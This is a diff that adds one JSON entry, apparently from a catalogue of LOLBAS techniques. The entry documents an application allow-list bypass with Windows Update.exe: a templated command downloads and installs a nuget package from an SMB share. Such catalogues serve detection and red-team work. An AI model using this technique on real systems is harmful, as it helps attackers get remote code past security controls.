@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-update-exe-awl-bypass-5",
+  "name": "LOLBAS · Update.exe (AWL Bypass) #5",
+  "command": "Update.exe --updateRollback={PATH_SMB:folder}",
+  "description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "update",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Update/",
+  "upstream_id": "Update.exe/AWL Bypass/4",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — Update.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Update/"
+    }
+  ]
+}
